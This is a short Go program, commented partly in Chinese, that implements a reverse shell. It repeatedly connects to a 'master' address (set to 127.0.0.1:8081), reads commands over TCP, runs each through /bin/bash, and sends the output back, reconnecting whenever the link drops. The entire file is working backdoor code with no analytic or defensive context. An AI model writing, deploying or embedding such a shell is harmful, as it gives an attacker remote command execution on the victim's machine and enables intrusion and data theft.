package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"time"
)

// 等待时间，单位秒
var waitTime int64 = 10

func reverseshell(addr string) {

chk_conn:
	// make sure the master is online
	for {
		c, e := net.Dial("tcp", addr)
		if e != nil {
			time.Sleep(3 * time.Second)
		} else {
			c.Close()
			break
		}
	}

	// now send out our shell
	conn, _ := net.Dial("tcp", addr)
	for {
		status, disconn := bufio.NewReader(conn).ReadString('\n')
		if disconn != nil {
			goto chk_conn
			break
		}

		textChan := make(chan string)
		cmd := exec.Command("/bin/bash", "-c", status)
		cmdReader, err := cmd.StdoutPipe()
		if err != nil {
			fmt.Println("\033[31;1m Error creating StdoutPipe for Cmd", err)
		}

		//转发sh的输出结果
		scanner := bufio.NewScanner(cmdReader)
		go func(cmd *exec.Cmd) {
			var startTime = time.Now().Unix()
			var ouTtext string
			for scanner.Scan() {
				nowTime := time.Now().Unix()
				if ouTtext != "" {
					ouTtext = ouTtext + "\n"
				}
				ouTtext = ouTtext + scanner.Text()
				if nowTime-startTime > waitTime {
					cmd.Process.Kill()
				}
			}
			textChan <- ouTtext
		}(cmd)

		//执行
		err = cmd.Start()
		if err != nil {
			fmt.Println("\033[31;1mStart for Cmd", err)
		}

		// 等待程序结束
		_ = cmd.Wait()
		var out string
		out = <-textChan
		conn.Write([]byte(out))
	}
}

func main() {
	var master_ip string
	master_ip = "127.0.0.1:8081"
	reverseshell(master_ip)
}
